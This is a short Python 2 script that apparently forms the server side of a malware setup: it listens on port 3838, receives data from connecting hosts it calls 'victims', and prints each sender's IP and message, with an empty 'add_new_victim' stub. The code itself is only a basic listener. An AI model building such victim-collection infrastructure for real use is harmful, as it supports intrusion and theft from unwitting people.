import socket
from messenger import *
from time import sleep

LISTEN_PORT = 3838


def add_new_victim():
    print "Adding New Victim"


def main():
    while True:
        s = Messenger.set_up_listening_socket(LISTEN_PORT)
        data, victim = s.recvfrom(8192)
        print "Victim IP is %s" % (str(victim))
        print data
        s.close()


if __name__ == '__main__':
    main()
